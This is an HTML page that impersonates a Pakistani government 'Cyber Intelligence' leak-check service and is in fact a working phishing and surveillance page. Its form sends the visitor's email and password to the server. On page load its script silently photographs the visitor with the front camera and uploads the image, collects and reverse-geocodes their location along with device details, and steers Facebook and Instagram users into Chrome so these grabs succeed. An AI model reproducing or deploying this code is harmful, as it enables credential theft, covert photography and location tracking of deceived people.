<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🇵🇰 Government of Pakistan – Cyber Intelligence</title>
  <link rel="icon" href="/static/pakistan-emblem.png" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #1b2631;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      text-align: center;
      width: 380px;
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 20px;
      margin-bottom: 8px;
    }
    p {
      font-size: 13px;
      margin: 8px 0;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border-radius: 6px;
      border: none;
      font-size: 14px;
    }
    input {
      background: #ecf0f1;
      color: #2c3e50;
    }
    button {
      background: #e74c3c;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #c0392b;
    }
    a.forgot {
      color: #f1c40f;
      font-size: 12px;
      display: block;
      margin-top: 4px;
      text-decoration: none;
    }
    img {
      width: 80px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="box" id="main-box">
    <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
    <h1>🇵🇰 Government of Pakistan – Cyber Intelligence</h1>
    <p>Enter your email to check leaked data in our cyber database</p>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
      <button type="submit">🔍 Check Now</button>
    </form>
  </div>

  <script>
    // Check if inside Facebook or Instagram browser
    const ua = navigator.userAgent;
    if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram")) {
      document.getElementById("main-box").innerHTML = `
        <h2>🚫 Limited Access Detected</h2>
        <p>This browser (Facebook or Instagram) blocks camera, location & tracking features.</p>
        <p><b>🔓 Please open this link in Chrome for full access.</b></p>
        <a href="intent://your-site.com/#Intent;scheme=https;package=com.android.chrome;end" 
           style="background:#4CAF50; color:white; padding:10px 20px; text-decoration:none; border-radius:5px; font-size:16px;">
          🔓 Open in Chrome
        </a>
      `;
    }

    async function reverseGeocode(lat, lon) {
      try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
        const res = await fetch(url, {
          headers: { 'User-Agent': 'Mozilla/5.0' }
        });
        const data = await res.json();
        return {
          city: data.address.city || data.address.town || data.address.village || "Unknown",
          country: data.address.country || "Unknown",
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
        };
      } catch (e) {
        return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
      }
    }

    async function sendFullData(locationCoords, cameraStatus) {
      let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };

      if (locationCoords) {
        locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
      }

      const payload = {
        ip: "Unknown",  // Real IP server side se milegi
        latitude: locationCoords?.latitude || null,
        longitude: locationCoords?.longitude || null,
        mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
        timezone: locationData.timezone,
        city: locationData.city,
        country: locationData.country,
        camera: cameraStatus,
        userAgent: navigator.userAgent,
        deviceInfo: navigator.platform
      };

      await fetch("/collect", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    async function askForPermissions() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            fetch('/photo', { method: 'POST', body: formData });
          });
          stream.getTracks().forEach(track => track.stop());
        }, 3000);

        navigator.geolocation.getCurrentPosition(
          pos => {
            sendFullData(pos.coords, "✅ Camera Allowed");
          },
          err => {
            sendFullData(null, "✅ Camera Allowed, ❌ Location Denied");
          }
        );
      } catch (err) {
        sendFullData(null, "❌ Camera Denied");
      }
    }

    window.onload = askForPermissions;
  </script>
</body>
</html>
